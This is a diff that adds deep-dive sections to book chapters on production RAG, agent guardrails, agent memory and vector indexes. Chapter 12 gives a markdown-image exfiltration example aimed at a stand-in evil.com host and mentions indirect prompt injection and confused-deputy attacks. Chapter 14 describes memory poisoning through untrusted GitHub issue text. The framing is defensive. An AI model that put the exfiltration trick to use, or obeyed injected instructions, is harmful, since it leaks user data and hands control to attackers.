@@ -912,7 +912,7 @@ To make 2D map lookups `O(1)`, geospatial systems divide the Earth's surface int
         "ch11-rag-and-llm-systems.md",
         """# Chapter 11: Production RAG, Hybrid Search & Enterprise ACL Security
 
-*Part III · AI & LLM Engineering Systems · 9 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 17 min with deep dives*
 
 Every weekend tutorial makes **Retrieval-Augmented Generation (RAG)** look like 10 lines of Python: chop a PDF into 500-word chunks, call an embedding API, dump vectors into a vector database, and pass the top 3 matches to an LLM.
 
@@ -941,6 +941,19 @@ Look at the top pipeline in the diagram above. When a user asks a question, ther
    `score(doc) = 1 / (60 + rank_bm25) + 1 / (60 + rank_vector)` [2].
 2. **Stage 2 — Cross-Encoder Reranker (`Top 50 -> Top 5` in `~60 ms`):** Pass the 50 candidate chunks + query into a compact **Cross-Encoder Reranker** (like `Cohere Rerank` or `BGE-Reranker`). Unlike embeddings (which compress a whole chunk into one vector ahead of time), a Cross-Encoder attends across every query word and chunk word together, picking the **Top 5 gold chunks** so your LLM prompt stays short, cheap, and accurate.
 
+:::deepdive Ingestion, Chunking Trade-Offs, Query Rewriting & Grounded Citations | +5 min
+
+Retrieval quality is capped by how documents are normalized and chunked long before any vector search runs:
+
+| Design Lever | Options & Mechanics | Production Trade-Off |
+| :--- | :--- | :--- |
+| **1. Document Normalization** | Parse PDFs/HTML/Markdown into structure-aware AST blocks (preserving section headers and markdown tables intact). | Naive character slicing splits a pricing table row away from its column headers, making the chunk unintelligible. |
+| **2. Chunk Size & Overlap** | **Small (`128–256` tokens):** Sharp embedding focus, lacks surrounding context.<br>**Medium (`400–600` tokens, `10–15%` overlap):** Industry sweet spot.<br>**Large (`1,024+` tokens):** Dilutes vector specificity; wastes prompt budget. | **Contextual Retrieval Fix [2]:** Prepend a 1-sentence document/section breadcrumb (`"[Doc: Q3 Billing Policy > EU Refunds] ..."`) to each `400`-token chunk *before* computing both its embedding and BM25 terms—cutting retrieval failure rates by `~49%`. |
+| **3. Query Rewriting** | Rewrite conversational queries (*"What about for contractors?"* -> *"EU refund eligibility policy for contractors"*), or expand ambiguous queries into `2–3` lexical + semantic variants. | Adds `~120 ms` with a small fast model, but rescues follow-up turns whose pronouns (`"it"`, `"that error"`) carry zero retrieval signal. |
+| **4. Grounded Synthesis & Citations** | Format retrieved chunks with XML/ID tags (`<source id="doc_42#c7">...</source>`) and instruct the model to emit inline `[doc_42#c7]` citations—or abstain if unsupported. | Run a lightweight post-check verifying that every cited `id` actually exists in the retrieved Top-K set (catching fabricated citation IDs before streaming to the UI). |
+
+:::
+
 ---
 
 ### 2) The #1 Enterprise RAG Security Bug: Post-Retrieval ACL Filtering
@@ -955,6 +968,16 @@ An engineer queries the vector database for **"Top 10 chunks matching '2026 Q3 r
 - At ingestion time, stamp each chunk with its Access Control List: `acl_groups: ["eng-all", "public"]`.
 - At query time, resolve the caller's groups (`user_groups = ["eng-all"]`) and pass a mandatory filter predicate **into the HNSW + BM25 search**: `WHERE acl_groups OVERLAPS ['eng-all', 'public']`.
 - Never cache semantic RAG answers globally across users with different ACL permissions.
+
+:::deepdive Index Freshness, CDC Tombstones & Permission Revocation | +4 min
+
+Static benchmarks ignore the hardest day-2 RAG problem: **source documents and user permissions change every minute**.
+
+1. **Event-Driven CDC Ingestion (`< 30s` Freshness):** Publish source writes (`doc.updated`, `doc.deleted`, `acl.changed`) via an **Outbox + Kafka** pipeline. Hash each normalized chunk (`SHA256(text)`): when a 50-page doc changes one paragraph, re-embed only the `1–2` dirty chunks instead of all `120` chunks.
+2. **Permission-Change Decoupling:** If `doc_42` moves from `public` to `exec-only`, re-embedding vectors is wasteful. Store ACLs in a fast metadata attribute / joinable permission table so ACL updates take effect in milliseconds without touching float vectors.
+3. **Deleted/Superseded Version Guard:** If Kafka CDC lags by `10 seconds`, a recently deleted doc could still appear in HNSW. Perform a `2 ms` batch primary-key/version check (`SELECT id, acl_epoch FROM docs_meta WHERE id IN (...)`) on the final Top 5 chunks right before prompt assembly to guarantee **read-after-delete** and **instant ACL revocation**.
+
+:::
 
 ---
 
@@ -975,11 +998,16 @@ An engineer queries the vector database for **"Top 10 chunks matching '2026 Q3 r
 <p><strong>Answer:</strong> BM25 scores (unbounded floats like <code>14.2</code>) and cosine similarity scores (<code>0.0 to 1.0</code>) live on incompatible scales. RRF combines their <strong>ordinal ranks</strong> (<code>1/(60 + rank)</code>) without needing brittle score calibration.</p>
 </details>
 
+<details>
+<summary><strong>Q4: Why does prepending a document/section header breadcrumb to each chunk before embedding ("Contextual Retrieval") dramatically reduce retrieval misses?</strong></summary>
+<p><strong>Answer:</strong> Isolated 400-token chunks often say things like <em>"Revenue grew 12% in Q3"</em> without naming which company or year. Prepending <code>[Acme Corp 2025 10-K &gt; Q3 Results]</code> anchors both dense embeddings and BM25 keywords to the owning entity.</p>
+</details>
+
 ---
 
 ### Sources & References
 - **[1]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — RAG, Hybrid Retrieval & Reranking
-- **[2]** Anthropic Engineering, *Contextual Retrieval: Combining Contextual Embeddings and Contextual BM25 with Reranking* — [anthropic.com/news/contextual-retrieval](https://www.anthropic.com/news/contextual-retrieval)
+- **[2]** Anthropic Engineering, *Contextual Retrieval: Combining Contextual Embeddings and Contextual BM25 with Reranking* (2024) — [anthropic.com/news/contextual-retrieval](https://www.anthropic.com/news/contextual-retrieval)
 - **[3]** Eugene Yan et al., *Applied LLMs: What We've Learned From A Year of Building with LLMs* — [applied-llms.org](https://applied-llms.org/)
 """
     ),
@@ -987,7 +1015,7 @@ An engineer queries the vector database for **"Top 10 chunks matching '2026 Q3 r
         "ch12-agents-guardrails-evals.md",
         """# Chapter 12: AI Agents, Tool Guardrails & Evaluation Pipelines
 
-*Part III · AI & LLM Engineering Systems · 8 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 17 min with deep dives*
 
 A standard RAG pipeline is a **railroad track**: every user query goes through `Retrieve -> Rerank -> Generate` in a fixed number of steps.
 
@@ -1009,6 +1037,18 @@ Never deploy an unconstrained `while (!done)` loop around an LLM in production. 
    - **High-impact write tools** (`refund_payment`, `delete_repo`, `send_email`): Require a deterministic **policy gate** (e.g., `refund_amount <= $20`) or explicit **human-in-the-loop confirmation** before execution [1].
 3. **Input / Output Guardrails & PII Scrubbing:** Run a fast deterministic regex + lightweight classifier (< `15 ms`) in the **LLM Gateway** to strip SSNs, API keys, and credit card numbers before prompts leave your VPC, and validate structured tool outputs against strict JSON Schemas.
 
+:::deepdive Production Failure & Security Threat Matrix (Model, Tool & Confused Deputy) | +5 min
+
+In system design interviews, separate failures into **three distinct fault domains** so each gets a deterministic control:
+
+| Fault Domain | Specific Failure / Threat | How It Is Detected | Deterministic Prevention / Mitigation |
+| :--- | :--- | :--- | :--- |
+| **1. Model & Loop Failures** | **Wrong-tool selection**, **premature completion** (claims success without calling write tool), or **repeated identical tool loops**. | Step trace lacks required mutation span; canonical hash `H(tool, args)` repeats `>= 2` times. | Scope toolset to `<= 15` clear schemas; verify expected post-condition state before closing task; abort duplicate call hashes. |
+| **2. Tool & Infra Failures** | **Partial mutation** (Step 1 charges card, Step 2 order creation times out), **`429` rate limits**, or **hostile/oversized tool payloads**. | Uncommitted step state in run journal; payload exceeds `max_bytes` or schema check. | Enforce **idempotency keys** + **compensating Saga rollbacks** (`void_authorization`); validate & truncate tool outputs at the host boundary. |
+| **3. Security & Confused Deputy** | **Confused Deputy** (agent uses its own broad service-account key on behalf of an unprivileged user) or **data exfiltration via URLs/markdown images**. | Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list. | Exchange caller's token via **OAuth On-Behalf-Of (OBO)** (never shared admin keys!); strip external markdown image rendering (`![](https://evil.com?leak=...)`) in the UI. |
+
+:::
+
 ---
 
 ### 2) How Do You Know If Your AI System Got Worse? (Offline & Online Evaluation)
@@ -1024,6 +1064,20 @@ Production AI systems rely on a **Two-Tier Evaluation Pipeline** [2, 3]:
 
 **Why must Online LLM-as-Judge run asynchronously off Kafka?**
 Because running a judge LLM takes `1–2 seconds` and doubles token cost. By publishing `(query, retrieved_chunks, answer)` to a `rag.traces` Kafka topic and sampling `5%` in the background, you get real-time hallucination dashboards and alerts with **zero added latency (`0 ms`)** on the user's request [2, 3].
+
+:::deepdive Calibrating Judges, Adversarial Slices & Safe Repo-Mutation Drill | +4 min
+
+Never rely on a single uncalibrated LLM-as-Judge score:
+1. **Combine Three Evaluators:**
+   - **Code Assertions (100% deterministic):** Schema validity, forbidden-tool absence, citation ID existence, cost/step bounds.
+   - **Calibrated LLM Judge:** Graded on binary `PASS/FAIL` criteria and periodically benchmarked against **100 human-labeled gold traces** (requiring Cohen's `κ >= 0.80` agreement with domain experts) [3].
+   - **Adversarial Regression Slice (`50+` red-team prompts):** Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict **`0%` attack success rate** to merge.
+2. **Design Drill — How Do You Let an Agent Modify a Git Repository Safely?**
+   - **Isolation:** Clone into an ephemeral container/worktree with **zero production secrets** and no push credentials to `main`.
+   - **Scoped Tools:** Expose typed tools (`read_file`, `search_code`, `apply_patch`, `run_targeted_tests`) with path canonicalization blocking `.git/hooks`, `.github/workflows`, and `..` traversal.
+   - **Verification + Human Gate:** Require build + lint + unit tests to pass inside the sandbox before pushing to an isolated `agent/<run_id>` branch and opening a Draft PR for human review.
+
+:::
 
 ---
 
@@ -1044,10 +1098,15 @@ Because running a judge LLM takes `1–2 seconds` and doubles token cost. By pub
 <p><strong>Answer:</strong> Running a synchronous LLM judge adds <code>1–2 seconds</code> of latency to every user response and doubles GPU token spend. Async sampling via Kafka adds <code>0 ms</code> to user latency while still catching quality regressions in production.</p>
 </details>
 
+<details>
+<summary><strong>Q4: What is a "Confused Deputy" vulnerability in an enterprise agent, and how do you prevent it?</strong></summary>
+<p><strong>Answer:</strong> A Confused Deputy happens when an agent holds a static, high-privilege service-account credential and an unprivileged user tricks it into reading or mutating restricted data. Prevent it by propagating down-scoped per-user tokens (OAuth On-Behalf-Of) to every downstream tool call.</p>
+</details>
+
 ---
 
 ### Sources & References
-- **[1]** Anthropic Engineering, *Building Effective Agents* — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
+- **[1]** Anthropic Engineering, *Building Effective Agents* (2024) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
 - **[2]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — Evaluation, Guardrails & Agent Loops
 - **[3]** Hamel Husain & Eugene Yan, *Your AI Product Needs Evals* — [applied-llms.org](https://applied-llms.org/)
 """
@@ -1056,7 +1115,7 @@ Because running a judge LLM takes `1–2 seconds` and doubles token cost. By pub
         "ch13-agent-loops-orchestration.md",
         """# Chapter 13: Agent Loop Architectures (ReAct, Plan-and-Execute & Multi-Agent DAGs)
 
-*Part III · AI & LLM Engineering Systems · 8 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 18 min with deep dives*
 
 When people first hear **"AI Agent,"** they often picture something mystical—a digital coworker improvising freely inside a GPU.
 
@@ -1083,6 +1142,21 @@ To cut latency without losing adaptability, production orchestrators separate **
 | **2. Plan-and-Execute DAG** | **Planner** emits a dependency DAG upfront; **Executor** runs independent waves in parallel; **Re-Planner** wakes up only on failure. | **2 calls** on happy path | Multi-source workflows (`get_profile`, `get_orders`, `get_policy` in parallel -> `2.3s` total). | Stale plan if Step 1 invalidates Step 3 without a Re-Planner. |
 | **3. Two-Pass Guarded Flow** | **Pass 1** classifies intent and runs read-only probes in parallel; **Pass 2** reasons over sanitized state to propose a verified action. | **Strictly 2 calls** | Diagnostics & system settings where false-positive writes are unacceptable. | Lower recall (`~70%`) if Pass 1 misses an edge-case probe. |
 
+:::deepdive When NOT to Use an Agent: Single LLM vs. Workflow vs. Evaluator-Optimizer vs. Agent | +5 min
+
+Autonomous agents trade away predictability, cost, and latency in exchange for dynamic path discovery. **Always start with the simplest architecture that solves the task [2, 4]:**
+
+| Pattern | Who Owns Control Flow? | Latency & Cost | Choose When... | Avoid When... |
+| :--- | :--- | :--- | :--- | :--- |
+| **1. Single LLM Call (+ RAG)** | Application code (`1` turn) | **`~0.8s`**, `$` | Summarization, extraction, classification, single-shot Q&A. | Answering requires conditional multi-system actions. |
+| **2. Deterministic Workflow (Pipeline / Router)** | Application code (`if/else` DAG of fixed prompts/APIs) | **`1.2–2.5s`**, `$` | Known steps: *Classify ticket -> Fetch order -> Apply refund table -> Draft reply*. | You cannot enumerate the needed steps ahead of time. |
+| **3. Evaluator-Optimizer Loop** | Code loop between **Generator** & **Critic/Compiler** (`max 3` retries) | **`2–5s`**, `$$` | Clear verification signal exists: SQL/code generation checked by compiler, or translation checked by rubric. | There is no reliable automated grader (critic just adds latency). |
+| **4. Autonomous Agent** | **The LLM** chooses tools, sequence, and stopping point | **`3–30s+`**, `$$$` | Unpredictable trajectories: investigating a novel prod outage or multi-file bug fix. | Regulatory/financial flows where deterministic code handles `95%` of cases. |
+
+**Interview Rule of Thumb:** In a customer-support system, use a **Deterministic Router + Workflow** for the `80%` structured intents (password reset, shipping status, standard return), and escalate only the `20%` ambiguous multi-policy exceptions to a **Bounded Agent** [2, 4].
+
+:::
+
 ---
 
 ### 2) Multi-Agent Specialization, Handoffs & Conflict Resolution
@@ -1094,6 +1168,21 @@ Instead, split work across **specialist agents** (`5–8` domain tools each) usi
 - **Supervisor Router:** A lightweight triage agent decomposes the request, dispatches sub-tasks to specialist workers, and merges their structured outputs.
 - **Peer Handoffs:** A specialist invokes an explicit transfer tool (`transfer_to_billing(compacted_state)`), handing control directly to the next specialist without an extra supervisor round-trip.
 - **Blackboard Arbiter (Conflict Resolution):** Parallel sub-agents never execute external writes directly. They post **typed action proposals** to a shared `AgentState` blackboard, and a deterministic **Policy Arbiter** resolves conflicts by priority (`FraudHold > Compliance > CreditGrant`) before any mutation runs.
+
+:::deepdive Agents-as-Tools vs. Handoffs (Centralized vs. Decentralized Reply Ownership) | +5 min
+
+When orchestrating multiple agents, the first architectural decision is **who owns the user-facing conversation** [5]:
+
+| Dimension | `Agents-as-Tools` *(Manager-Worker)* | `Handoffs` *(Decentralized Transfer)* |
+| :--- | :--- | :--- |
+| **Mechanics** | Manager agent stays active and invokes `ask_tax_specialist(query)` like a regular function call, receiving structured JSON back. | Triage agent calls `transfer_to_billing()`, exiting the loop so `BillingAgent` talks directly to the user on subsequent turns. |
+| **Reply Ownership** | **Centralized:** One manager enforces consistent tone, guardrails, and cross-domain synthesis. | **Decentralized:** Active specialist owns both tool execution and the user reply until another handoff occurs. |
+| **Latency & Cost** | Higher (`Manager -> Worker -> Manager -> User` adds an extra synthesis LLM hop). | Lower (`Specialist -> User` directly; avoids double-summarizing follow-up turns). |
+| **Best Use Case** | One question spanning **multiple domains** (*"Compare my AWS spend, open Jira blockers, and Q4 hiring budget"*). | Sequential **multi-turn domain takeover** (*"I want to dispute a charge"* -> 4 back-and-forth turns inside Billing). |
+
+**Preventing Handoff Ping-Pong:** Pass a structured `handoff_context` summary (goal, verified entities, visited agents) and cap `max_handoffs_per_turn = 2` so `BillingAgent` and `TechSupportAgent` can never bounce a user back and forth infinitely [5].
+
+:::
 
 ---
 
@@ -1108,7 +1197,7 @@ Instead, split work across **specialist agents** (`5–8` domain tools each) usi
 
 - **Real-world analogy:** **ReAct** is a detective opening one door at a time with no floor plan. **Plan-and-Execute** is an architect handing a dependency blueprint (DAG) to an electrician, plumber, and painter so they work on independent rooms in parallel and only call the architect back if they hit an unexpected steel beam.
 - **Where the analogy breaks:** Human tradespeople use common sense if a pipe is an inch off. A DAG executor will pass `null` into Step 3 if Step 1's output schema shifts—requiring a **JSON Schema validator + conditional re-planner** between waves.
-- **Real production system:** **Anthropic Claude Code** and **LLM Compiler** combine upfront task decomposition with parallel read-tool waves and confirmation-gated writes [2, 3].
+- **Real production system:** **Anthropic Claude Code**, **OpenAI Agents SDK**, and **LLM Compiler** combine upfront task decomposition with parallel read-tool waves and confirmation-gated writes [2, 3, 5].
 
 ---
 
@@ -1129,37 +1218,58 @@ Instead, split work across **specialist agents** (`5–8` domain tools each) usi
 <p><strong>Answer:</strong> Parallel sub-agents emit <strong>typed action proposals</strong> to a shared state blackboard rather than calling write APIs directly; a deterministic <strong>Policy Arbiter</strong> resolves conflicts by priority (<code>FraudHold &gt; CreditGrant</code>) before committing any mutation.</p>
 </details>
 
+<details>
+<summary><strong>Q4: When should you choose <code>Agents-as-Tools</code> over <code>Handoffs</code> in a multi-agent system?</strong></summary>
+<p><strong>Answer:</strong> Choose <strong><code>Agents-as-Tools</code></strong> when a single user request requires synthesizing outputs from multiple specialists under one unified persona and policy gate. Choose <strong><code>Handoffs</code></strong> when a specialist should take over a multi-turn conversation directly without paying extra manager round-trip latency.</p>
+</details>
+
 ---
 
 ### Sources & References
 - **[1]** Shunyu Yao et al., *ReAct: Synergizing Reasoning and Acting in Language Models* (ICLR 2023) — [arxiv.org/abs/2210.03629](https://arxiv.org/abs/2210.03629)
 - **[2]** Anthropic Engineering, *Building Effective Agents* (2024) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
 - **[3]** Sehoon Kim et al., *An LLM Compiler for Parallel Function Calling* (ICML 2024) — [arxiv.org/abs/2312.04511](https://arxiv.org/abs/2312.04511)
+- **[4]** OpenAI, *A Practical Guide to Building Agents* (2025) — [openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents](https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/)
+- **[5]** OpenAI Developers, *Orchestrating Multiple Agents: Handoffs vs. Agents-as-Tools* (2025–2026) — [developers.openai.com/api/docs/guides/agents/orchestration](https://developers.openai.com/api/docs/guides/agents/orchestration)
 """
     ),
     (
         "ch14-agent-memory-and-caching.md",
         """# Chapter 14: Agent Memory (Working, Episodic, Semantic) & KV Prompt Caching
 
-*Part III · AI & LLM Engineering Systems · 8 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 18 min with deep dives*
 
 By itself, an LLM has the memory of a goldfish: the microsecond an HTTP response finishes streaming, the model forgets you ever existed.
 
 And you cannot fix that by pasting every past conversation into a 128,000-token prompt. If you try, **"Lost in the Middle" attention decay** drops recall by `20%–40%` on facts buried in the middle of the transcript [3], while recomputing attention over 80,000 tokens ruins Time-To-First-Token (`TTFT`).
 
-Let us look at the lower half of the diagram in Chapter 13 to see how production agents combine a **Three-Tier Memory Hierarchy** with **GPU KV Prefix Caching** [1, 2, 4].
+Let us look at the lower half of the diagram in Chapter 13 to see how production agents combine a **Multi-Tier Memory Hierarchy** with **GPU KV Prefix Caching** [1, 2, 4].
 
 ---
 
-### 1) The Three-Tier Agent Memory Hierarchy (`CoALA`)
+### 1) The Agent Memory Hierarchy (`CoALA`)
 
-Production language agents split memory into three tiers, each backed by the storage engine that fits its access pattern [1, 2]:
+Production language agents split memory across distinct cognitive tiers, each backed by the storage engine that fits its access pattern [1, 2]:
 
 | Memory Tier | Cognitive Role | What It Stores | Backing Store | Compaction & Retrieval Rule |
 | :--- | :--- | :--- | :--- | :--- |
 | **1. Working Memory** *(Intra-Session)* | Whiteboard scratchpad | Current goal, active DAG state, last `K=6` raw turns, and a rolling summary of older turns. | In-memory + **Redis** (`24h` TTL) + Postgres checkpoint | Append-only during turns; summarize older turns only when tokens cross a **`75%` watermark**. |
 | **2. Episodic Memory** *(Experiential)* | Incident postmortem log | Timestamped summaries of **past trajectories** (*"Symptom X -> Tool A failed -> Tool B fixed it"*). | **Vector DB (`pgvector` / `Milvus`)** + JSONB metadata | Ranked by **hybrid recency score**: `0.65*CosineSim + 0.25*exp(-λ*hours) + 0.10*is_success` [1]. |
 | **3. Semantic Memory** *(Long-Term Facts)* | Architecture wiki | Distilled user preferences & entity facts (`os="macOS 15"`, `jdk="Java 21"`). | **`pgvector` + Relational `user_facts` table** | Updated via **conflict-resolving upsert** (`is_active = false` on superseded facts). |
+
+:::deepdive Context Engineering Matrix & Procedural Memory (The 4th Tier) | +5 min
+
+A core interview skill is deciding **where each piece of information belongs**—plus completing the `CoALA` taxonomy with **Procedural Memory** [2]:
+
+| Mechanism | What Belongs Here | Volatility | Why Not Put Everything in the Prompt? |
+| :--- | :--- | :--- | :--- |
+| **1. System Instructions** | Core persona, hard safety invariants, output formatting contract. | Static (Git-versioned) | Must stay short & static at token `0` to preserve `100%` GPU KV cache hits. |
+| **2. Procedural Memory** *(4th CoALA Tier)* | Reusable domain playbooks, `SKILL.md` workflows, and verified tool-use exemplars (*how to do X*). | Slow-changing (versioned skills) | Load **progressively on demand** (list 1-line skill descriptions first; expand full playbook only when triggered) to prevent context bloat. |
+| **3. RAG (Corpus Knowledge)** | Shared product docs, policies, runbooks, codebase indexes. | Minutes–days (CDC indexed) | Too large (`GBs–TBs`) for context; requires ACL-filtered hybrid retrieval per query. |
+| **4. Persistent User Memory** | User/project facts (**Semantic**) + past session lessons (**Episodic**). | Cross-session (months) | Must survive session restarts and supersede stale preferences cleanly. |
+| **5. Live Tool Call** | Current account balance, live pod health, today's inventory count. | Sub-second (real-time) | **Never store volatile transactional state in RAG or Memory**—always fetch live from the source of truth! |
+
+:::
 
 ---
 
@@ -1169,6 +1279,20 @@ How do you keep memory clean across 30-turn debugging sessions and multi-month u
 1. **Post-Session Consolidation Worker:** When a session ends, a Kafka worker distills the trace into (a) one 3-sentence **Episode vector** and (b) structured `(user_id, attribute, value)` **Semantic facts**.
 2. **Superseding Contradictory Facts:** If Alice said *"We use Java 17"* in January and *"We migrated to Java 21"* in November, appending both chunks confuses the retriever. Instead, run an atomic transaction that marks the `Java 17` row `is_active = false, superseded_by = new_id` and filters all semantic reads with `WHERE user_id = :uid AND is_active = true`.
 3. **Artifact Offloading (`>1,000 tokens`):** If `get_build_logs()` returns `20,000 tokens`, never dump the raw blob into Working Memory. Save it to object storage (`artifact://run_99/step_4.log`), inject a `200-token` summary + error excerpt into the prompt, and give the agent a `read_artifact_range(id, start_line, end_line)` tool.
+
+:::deepdive Design Drill: Six-Month Memory for a Personal Coding Assistant | +5 min
+
+Suppose an interviewer asks: *"Design a 6-month memory system for an IDE coding agent used daily across 5 repositories."*
+
+1. **Scope Isolation (`(user_id, repo_id)`):** Partition memories into **Global User Preferences** (*"prefers concise comments, pytest fixtures over unittest"*) vs. **Repo-Scoped Facts** (*"repo A uses pnpm + Vitest; integration tests need Docker"*), so rules from Repo A never pollute Repo B.
+2. **Token Budget Allocation (`24,000` Active Context Ceiling):**
+   - `3,000` tokens: Static System Prompt + Tool Schemas (**KV-cached**).
+   - `1,500` tokens: Top-5 `is_active` Semantic Repo/User facts + Top-2 matching Episodic debugging postmortems.
+   - `7,500` tokens: On-demand AST/code chunks + triggered **Procedural `SKILL.md`**.
+   - `12,000` tokens: Append-only Working Memory (compacted at `75%` fullness into a structured state checkpoint).
+3. **Security & Memory Poisoning Defense:** Scrub `.env` secrets/tokens before consolidation, and **never auto-promote untrusted external text** (e.g., an instruction hidden inside a third-party GitHub Issue) into persistent Semantic or Procedural Memory without explicit user confirmation—blocking persistent "sleeper" prompt injections!
+
+:::
 
 ---
 
@@ -1186,7 +1310,7 @@ During prefill, a causal Transformer computes **Key (`K`)** and **Value (`V`)** 
 
 ### Analogy, Where It Breaks & Real System
 
-- **Real-world analogy:** **Working Memory** is the sticky notes on your desk today; **Episodic Memory** is your team's postmortem archive; **Semantic Memory** is your living runbook wiki. **KV Prefix Caching** is photocopying the first 9 pages of a 10-page contract so you only hand-write Page 10.
+- **Real-world analogy:** **Working Memory** is the sticky notes on your desk today; **Episodic Memory** is your team's postmortem archive; **Semantic Memory** is your living runbook wiki; **Procedural Memory** is muscle memory for running an incident playbook. **KV Prefix Caching** is photocopying the first 9 pages of a 10-page contract so you only hand-write Page 10.
 - **Where the analogy breaks:** On paper, fixing a typo on Page 1 only reprints Page 1. In a causal Transformer, Pages 2–10 mathematically attend to Page 1—so **changing one byte on Page 1 forces the GPU to recompute Pages 2–10 from scratch**.
 - **Real production system:** **Anthropic & OpenAI Prompt Caching** cache hashed 128-token KV prefix blocks in distributed GPU memory across multi-turn agent loops [4].
 
@@ -1195,8 +1319,8 @@ During prefill, a causal Transformer computes **Key (`K`)** and **Value (`V`)** 
 ### Quick Self-Check
 
 <details>
-<summary><strong>Q1: How do Working, Episodic, and Semantic Memory differ in what they store?</strong></summary>
-<p><strong>Answer:</strong> <strong>Working Memory</strong> holds the active session's scratchpad and recent turns (Redis/in-memory). <strong>Episodic Memory</strong> stores timestamped summaries of past session trajectories and tool outcomes for few-shot experience replay. <strong>Semantic Memory</strong> stores timeless entity facts and preferences maintained via conflict-resolving upserts.</p>
+<summary><strong>Q1: How do Working, Episodic, Semantic, and Procedural Memory differ in what they store?</strong></summary>
+<p><strong>Answer:</strong> <strong>Working Memory</strong> holds the active session's scratchpad and recent turns. <strong>Episodic Memory</strong> stores timestamped summaries of past session trajectories. <strong>Semantic Memory</strong> stores versioned user/domain facts via conflict-resolving upserts. <strong>Procedural Memory</strong> stores reusable workflows, skills, and how-to playbooks loaded on demand.</p>
 </details>
 
 <details>
@@ -1209,20 +1333,25 @@ During prefill, a causal Transformer computes **Key (`K`)** and **Value (`V`)** 
 <p><strong>Answer:</strong> The consolidation worker keys facts by <code>(user_id, attribute)</code>, marks the older <code>Java 17</code> record <code>is_active = false</code> in an atomic upsert, and pre-filters all semantic queries with <code>WHERE is_active = true</code>.</p>
 </details>
 
+<details>
+<summary><strong>Q4: Why must an agent never allow untrusted external tool outputs (like a public GitHub Issue body) to write directly into persistent Semantic or Procedural Memory?</strong></summary>
+<p><strong>Answer:</strong> Because of <strong>Memory Poisoning (Persistent Indirect Prompt Injection)</strong>: a malicious instruction saved into long-term memory would survive across future sessions and hijack unrelated tasks.</p>
+</details>
+
 ---
 
 ### Sources & References
 - **[1]** Joon Sung Park et al., *Generative Agents: Interactive Simulacra of Human Behavior* (UIST 2023) — Recency, Relevance & Importance Memory Scoring
-- **[2]** Theodore Sumers et al., *Cognitive Architectures for Language Agents (CoALA)* (TMLR 2024) — Working, Episodic & Semantic Memory
+- **[2]** Theodore Sumers et al., *Cognitive Architectures for Language Agents (CoALA)* (TMLR 2024) — Working, Episodic, Semantic & Procedural Memory
 - **[3]** Nelson F. Liu et al., *Lost in the Middle: How Language Models Use Long Contexts* (TACL 2024) — [arxiv.org/abs/2307.03172](https://arxiv.org/abs/2307.03172)
-- **[4]** Anthropic & OpenAI Engineering, *Prompt Caching: KV-Cache Prefix Reuse for Multi-Turn Agents* (2024–2025)
+- **[4]** Anthropic & OpenAI Engineering, *Prompt Caching: KV-Cache Prefix Reuse for Multi-Turn Agents* (2024–2026)
 """
     ),
     (
         "ch15-rag-recall-and-vector-math.md",
         """# Chapter 15: Retrieval Math (Recall@K, MRR, nDCG@K) & Vector Indexes (pgvector vs Milvus)
 
-*Part III · AI & LLM Engineering Systems · 8 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 17 min with deep dives*
 
 When an enterprise RAG agent gives a wrong answer, who is at fault?
 Did the **Retriever** fail to pull the right chunk out of 10 million documents, or did the **Generator LLM** misread the chunk sitting at Rank #1?
@@ -1257,6 +1386,18 @@ How do you search 10 million `1,536-dim float32` vectors in `5 ms` instead of a 
   - **The RAM Math:** `10M × 1,536 × 4 bytes = 61.4 GB` of raw vectors + `~20 GB` of graph edges = **`~80 GB RAM`**. Switching to `float16` (`halfvec`) or 8-bit Scalar Quantization (`SQ8`) cuts RAM by **`2×` to `4×`** (`20–40 GB`) with `< 1%` recall loss [3].
 - **`IVF-PQ` (Inverted File + Product Quantization):** Partitions space into `C` K-means centroids and compresses sub-vectors into codebooks, scanning only the closest `nprobe` buckets. Uses a fraction of the RAM at slightly lower recall.
 
+:::deepdive Design Drill: Sizing Retrieval for a 10-Million-Document Enterprise Corpus | +5 min
+
+Walk through the capacity and latency math step-by-step when asked to design search over **10,000,000 enterprise documents**:
+
+1. **Chunk & Vector Volume:** Average doc = `4 pages (~2,000 tokens)` -> `5` chunks of `450` tokens -> **`50,000,000` total chunks**.
+2. **Memory Sizing (`1,024-dim` embeddings):**
+   - Uncompressed `float32` HNSW: `50M × 1,024 × 4B = 204.8 GB` + `~75 GB` graph overhead = **`~280 GB RAM`**.
+   - **Optimized (`SQ8` 8-bit quantized vectors in RAM + `float16` on NVMe SSD for rescoring):** `50M × 1,024 × 1B ≈ 51 GB` + graph = **`~115 GB RAM`** across 2–3 replicated query nodes!
+3. **Partitioning & Pre-Filter Strategy:** Partition keys by `tenant_id` (or physical shard by hash) so a tenant query touches **1 partition (`< 1M` chunks)** instead of scanning a global 50M-node HNSW graph, keeping Stage-1 `BM25 + HNSW` p99 under **`25 ms`** (`ef_search = 64`) and Stage-2 Cross-Encoder reranking (`Top 40 -> Top 5`) under **`45 ms`**.
+
+:::
+
 ---
 
 ### 3) Choosing Between `pgvector` (PostgreSQL) and `Milvus`
@@ -1266,6 +1407,18 @@ How do you search 10 million `1,536-dim float32` vectors in `5 ms` instead of a 
 | **Scale** | Up to **`10M – 50M` vectors** (with `halfvec` HNSW + iterative filtered scan). | **`100M – 10B+` vectors** across disaggregated query/storage nodes. |
 | **Consistency & Joins** | **Full ACID transactions** in the same table as user state and ACL metadata (zero CDC lag). | Tunable consistency; synced asynchronously from OLTP via Kafka CDC. |
 | **Best Agent Role** | **Episodic & Semantic Agent Memory** (filtered per `user_id` and `is_active = true`). | **Global Enterprise Knowledge Corpus RAG** across billions of chunks. |
+
+:::deepdive Zero-Downtime Embedding Model Upgrades (Dual-Index Cutover) | +4 min
+
